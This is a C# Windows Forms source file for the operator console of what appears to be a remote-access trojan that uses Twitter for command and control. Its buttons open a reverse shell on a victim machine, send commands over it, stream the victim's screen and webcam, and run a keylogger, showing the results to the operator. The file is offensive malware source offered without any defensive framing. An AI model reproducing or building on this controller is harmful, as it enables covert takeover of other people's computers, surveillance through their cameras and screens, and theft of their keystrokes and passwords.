using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO;
using TwitterCommandAndControl;
using TwitterCommandAndControl.Handlers;

namespace ControlCenter
{
    public partial class Main : Form
    {
        private Screen display;
        private TcpClient _client;
        private TcpClient Client 
        {
            get { return _client; }
            set
            {
                if (_client != null) 
                    _client.Close();

                _client = value;
            }
        }
        public Main()
        {
            InitializeComponent();
        }

        private void ShellButton_Click(object sender, EventArgs e)
        {
            ShellButton.Enabled = false;
            ShellOutput.AppendText("Waiting for reverse shell..." + Environment.NewLine);
            Task.Run(() =>
            {
                Client = ReverseShellHandler.Request(ShellPrefix.Text);
                ShellButton.Invoke(new MethodInvoker(() => { ShellButton.Enabled = true; }));
                if (Client != null && Client.Connected)
                {
                    ShellOutput.Invoke(new MethodInvoker(() => { ShellOutput.AppendText("Reverse shell established!" + Environment.NewLine); }));
                    
                    HandleClient();
                }
                else
                {
                    ShellOutput.Invoke(new MethodInvoker(() => { ShellOutput.AppendText("Failed to establish reverse shell!" + Environment.NewLine); }));
                    Client = null;
                }
            });
        }

        private void HandleClient()
        {
            Task.Run(() =>
            {
                try
                {
                    var c = Client;
                    while (c != null && c.Connected)
                    {
                        var reader = new StreamReader(c.GetStream());
                        var output = reader.ReadLine();
                        while (!string.IsNullOrEmpty(output))
                        {
                            ShellOutput.Invoke(new MethodInvoker(() => { ShellOutput.AppendText(output + Environment.NewLine); }));
                            try { output = reader.ReadLine(); }
                            catch { output = null; }
                        }

                    }
                }
                catch { }
                finally { }
                ShellOutput.Invoke(new MethodInvoker(() => { ShellOutput.AppendText("Reverse shell lost!" + Environment.NewLine); }));
            });
        }

        private void CommandButton_Click(object sender, EventArgs e)
        {
            var writer = new StreamWriter(Client.GetStream());
            writer.WriteLine(CommandText.Text);
            writer.Flush();
            CommandText.Clear();
        }

        private void ScreenCapture_Click(object sender, EventArgs e)
        {
            ScreenCapture.Enabled = false;
            ShellOutput.AppendText("Requesting Screen Capture..." + Environment.NewLine);
            if (display != null) display.Close();
            display = new Screen();
            display.Show();
            Task.Run(() =>
            {
                Client = ScreenCaptureHandler.Request(ShellPrefix.Text);
                ScreenCapture.Invoke(new MethodInvoker(() => { ScreenCapture.Enabled = true; }));
                if (Client != null && Client.Connected)
                {
                    ShellOutput.Invoke(new MethodInvoker(() => { ShellOutput.AppendText("Screen Capture Successful!" + Environment.NewLine); }));
                    display.Client = Client;
                }
                else
                {
                    ShellOutput.Invoke(new MethodInvoker(() => { ShellOutput.AppendText("Screen Capture Failed!" + Environment.NewLine); }));
                    Client = null;
                }
            });
        }

        private void Webcam_Click(object sender, EventArgs e)
        {
            Webcam.Enabled = false;
            ShellOutput.AppendText("Requesting Webcam..." + Environment.NewLine);
            if (display != null) display.Close();
            display = new Screen();
            display.IsStreaming = true;
            display.Show();
            Task.Run(() =>
            {
                Client = WebcamHandler.Request(ShellPrefix.Text);
                Webcam.Invoke(new MethodInvoker(() => { Webcam.Enabled = true; }));
                if (Client != null && Client.Connected)
                {
                    ShellOutput.Invoke(new MethodInvoker(() => { ShellOutput.AppendText("Webcam Successful!" + Environment.NewLine); }));
                    display.Client = Client;
                }
                else
                {
                    ShellOutput.Invoke(new MethodInvoker(() => { ShellOutput.AppendText("Webcam Failed!" + Environment.NewLine); }));
                    Client = null;
                }
            });
        }

        private void KeyLogger_Click(object sender, EventArgs e)
        {
            KeyLogger.Enabled = false;
            ShellOutput.AppendText("Requesting Key Logger..." + Environment.NewLine);
            
            Task.Run(() =>
            {
                Client = KeyLoggerHandler.Request(ShellPrefix.Text);
                KeyLogger.Invoke(new MethodInvoker(() => { KeyLogger.Enabled = true; }));
                if (Client != null && Client.Connected)
                {
                    ShellOutput.Invoke(new MethodInvoker(() => { ShellOutput.AppendText("Key Logger Successful!" + Environment.NewLine); }));
                    HandleClient();
                }
                else
                {
                    ShellOutput.Invoke(new MethodInvoker(() => { ShellOutput.AppendText("Key Logger Failed!" + Environment.NewLine); }));
                    Client = null;
                }
            });
        }

        private void ShellOutput_DoubleClick(object sender, EventArgs e)
        {

        }

        
    }
}
